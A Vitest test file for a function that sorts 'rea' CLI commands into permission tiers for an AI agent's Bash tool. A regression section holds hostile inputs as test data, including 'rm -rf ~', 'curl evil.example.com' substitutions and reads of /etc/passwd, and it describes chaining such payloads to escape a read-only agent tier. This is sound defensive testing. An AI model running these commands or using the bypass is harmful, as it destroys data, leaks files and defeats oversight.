/**
 * Tests for `reaCommandTier()` — tier classification of `rea <sub>` Bash
 * invocations (Defect E / rea#78).
 *
 * Context: before this helper, ANY Bash-wrapped invocation of rea's own CLI
 * was classified Write (the generic Bash default), which meant an L1 agent
 * could not run `rea cache check` — not to mention the commands the push-gate
 * remediation literally tells the agent to run (`rea cache set <sha> pass
 * ...` and `rea audit record codex-review ...`). The helper fixes the
 * self-consistency break by classifying each subcommand by its own semantics.
 *
 * Trust model (post-Codex review):
 *   - FULL trust: `npx rea …`, `npx @bookedsolid/rea …`, or a first token
 *     that contains `/` and ends with a known entry-point suffix
 *     (`/node_modules/.bin/rea`, `/bin/rea`, `/.bin/rea`, `/dist/cli/index.js`).
 *     Full trust returns the natural tier for each subcommand.
 *   - WEAK trust: bare `rea` token (PATH-spoofable). Returns `Destructive`
 *     for `freeze` (upgrade preserved — block at L1 even if we cannot prove
 *     the binary is ours), returns `null` otherwise (no downgrade — defers
 *     to the generic Bash Write default).
 *   - No trust: returns `null` for any non-rea first token.
 */

import { describe, expect, it } from 'vitest';
import { reaCommandTier } from '../../src/config/tier-map.js';
import { Tier } from '../../src/policy/types.js';

describe('reaCommandTier — fully-trusted invocations (path-prefixed / npx)', () => {
  it.each([
    ['/usr/local/bin/rea check', Tier.Read],
    ['/usr/local/bin/rea doctor', Tier.Read],
    ['/usr/local/bin/rea status', Tier.Read],
    ['./node_modules/.bin/rea cache check abc --branch feat/x --base main', Tier.Read],
    ['./node_modules/.bin/rea cache list', Tier.Read],
    ['/opt/app/node_modules/.bin/rea cache get abc', Tier.Read],
    ['/usr/local/bin/rea audit verify', Tier.Read],
    ['/usr/local/bin/rea audit record codex-review --head-sha abc --verdict pass', Tier.Read],
    ['npx rea check', Tier.Read],
    ['npx rea cache check abc --branch a --base main', Tier.Read],
    ['npx @bookedsolid/rea doctor', Tier.Read],
  ])('%s → Read', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it.each([
    ['/usr/local/bin/rea cache set abc pass --branch feat/x --base main', Tier.Write],
    ['./node_modules/.bin/rea cache clear abc', Tier.Write],
    ['/usr/local/bin/rea audit rotate', Tier.Write],
    ['/usr/local/bin/rea init --yes', Tier.Write],
    ['/usr/local/bin/rea serve', Tier.Write],
    ['/usr/local/bin/rea upgrade --yes', Tier.Write],
    ['/usr/local/bin/rea unfreeze --yes', Tier.Write],
    ['/usr/local/bin/rea something-unrecognized', Tier.Write],
    ['npx rea init --yes', Tier.Write],
  ])('%s → Write', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it.each([
    ['/usr/local/bin/rea freeze --reason halt', Tier.Destructive],
    ['npx rea freeze --reason halt', Tier.Destructive],
  ])('%s → Destructive', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });

  it('bare /usr/.../rea (no subcommand) treats as Read — equivalent to --help', () => {
    expect(reaCommandTier('/usr/local/bin/rea')).toBe(Tier.Read);
  });

  it('tolerates leading/trailing whitespace', () => {
    expect(reaCommandTier('   /usr/local/bin/rea check   ')).toBe(Tier.Read);
  });
});

describe('reaCommandTier — weak-trust bare `rea` (PATH-spoofable)', () => {
  // Weak-trust: no Read downgrade. These would be Read under full trust but
  // bare `rea` defers to the generic Bash Write default (returns null).
  it.each([
    'rea check',
    'rea doctor',
    'rea status',
    'rea cache check abc',
    'rea audit verify',
    'rea audit record codex-review --head-sha abc --verdict pass',
    'rea',
  ])('%s → null (defers to generic Bash Write)', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  // Weak-trust: Write subcommands still return null — same generic default.
  it.each([
    'rea cache set abc pass',
    'rea init --yes',
    'rea upgrade --yes',
  ])('%s → null (write fall-through)', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  // Weak-trust: Destructive upgrade IS preserved. `rea freeze` at L1 must
  // block regardless of whether the binary on PATH is ours.
  it('rea freeze → Destructive even under weak trust', () => {
    expect(reaCommandTier('rea freeze --reason "stop"')).toBe(Tier.Destructive);
  });
});

describe('reaCommandTier — non-rea commands', () => {
  it.each([
    'ls -la',
    'git push',
    'node scripts/build.js',
    'npm install',
    'npx prettier --check .',
    'pnpm test',
    'rearrange-files',
    'area-test',
  ])('returns null for %s', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it('returns null for empty or whitespace-only input', () => {
    expect(reaCommandTier('')).toBeNull();
    expect(reaCommandTier('   ')).toBeNull();
  });

  it('returns null for npx without rea', () => {
    expect(reaCommandTier('npx prettier')).toBeNull();
    expect(reaCommandTier('npx')).toBeNull();
  });
});

/**
 * Codex HIGH regression — shell-metachar tier bypass.
 *
 * Before the fix, `reaCommandTier()` looked at tokens[0] after splitting on
 * whitespace. A command like `rea check && rm -rf ~` had tokens[0]='rea'
 * and tokens[1]='check', so the helper returned Read — downgrading the
 * entire Bash invocation (including the `&& rm -rf ~` payload) from the
 * generic Write tier. At L0 that would convert a read-only agent into an
 * effectively-unrestricted shell.
 *
 * The fix: refuse to classify any command that contains shell metacharacters
 * that would let the attacker chain commands, pipe data out, substitute,
 * or background. Null forces the generic Bash Write default.
 */
describe('reaCommandTier — shell-metacharacter bypass (Codex HIGH)', () => {
  it.each([
    // Chain operators
    '/usr/local/bin/rea check && touch /tmp/pwned',
    '/usr/local/bin/rea check || rm -rf ~',
    '/usr/local/bin/rea check ; rm -rf ~',
    // Pipe
    '/usr/local/bin/rea cache check abc | cat',
    // Background
    '/usr/local/bin/rea check & curl evil.example.com',
    // Command substitution
    '/usr/local/bin/rea check $(curl evil.example.com)',
    '/usr/local/bin/rea check `curl evil.example.com`',
    // Process substitution
    '/usr/local/bin/rea check >(tee /tmp/leak)',
    '/usr/local/bin/rea check <(cat /etc/passwd)',
    // Embedded newline
    '/usr/local/bin/rea check\ntouch /tmp/pwned',
    '/usr/local/bin/rea check\rcarriage-return',
    // Plain redirection (Codex HIGH 2 carry-over — redirection operators
    // write arbitrary data the classifier cannot model)
    '/usr/local/bin/rea check > /etc/passwd',
    '/usr/local/bin/rea check < /etc/passwd',
    '/usr/local/bin/rea check >> /tmp/out',
    '/usr/local/bin/rea doctor << EOF',
  ])('returns null for "%s"', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    // Bare name — PATH-spoofable. Weak-trust; Read downgrade denied.
    'rea check',
    'rea doctor',
    // Relative paths outside the trusted suffix list.
    './evil-rea freeze',
    './rea check',
    // Absolute paths not matching any trusted suffix.
    '/opt/evil-rea check',
    '/tmp/not-the-real-rea doctor',
  ])('returns null for weak/untrusted path-based "rea" invocations: %s', (cmd) => {
    expect(reaCommandTier(cmd)).toBeNull();
  });

  it.each([
    ['/usr/local/bin/rea doctor', Tier.Read],
    ['./node_modules/.bin/rea cache check abc', Tier.Read],
    ['/opt/app/node_modules/.bin/rea audit record codex-review', Tier.Read],
  ])('keeps classification for trusted paths: %s', (cmd, expected) => {
    expect(reaCommandTier(cmd)).toBe(expected);
  });
});
